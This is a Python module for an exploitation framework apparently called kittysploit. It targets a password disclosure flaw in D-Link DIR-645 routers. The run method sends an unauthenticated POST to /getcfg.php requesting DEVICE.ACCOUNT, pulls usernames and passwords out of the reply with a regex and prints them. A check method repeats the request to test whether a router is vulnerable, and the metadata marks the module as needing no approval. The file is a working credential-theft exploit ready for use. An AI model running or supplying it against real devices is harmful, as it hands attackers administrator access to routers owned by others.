#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-645 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DIR-645 Password Disclosure',
        'description': 'Module exploits D-Link DIR-645 password disclosure vulnerability.',
        'author': ['Roberto Paleari', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        # address and parameters
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        # connection
        response = self.http_request(
            method="POST",
            path="/getcfg.php",
            data=data
        )
        if response is None:
            return

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub(r'\s+', '', response.text))

        # displaying results
        if len(creds):
            print_success("Credentials found!")
            headers = ('Username', 'Password')
            creds = tuple(tuple([item[0], item[2]]) for item in creds)
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")
    def check(self):
        # address and parameters
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        response = self.http_request(
            method="POST",
            path="/getcfg.php",
            data=data
        )
        if response is None:
            return False  # target is not vulnerable

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub(r'\s+', '', response.text))

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
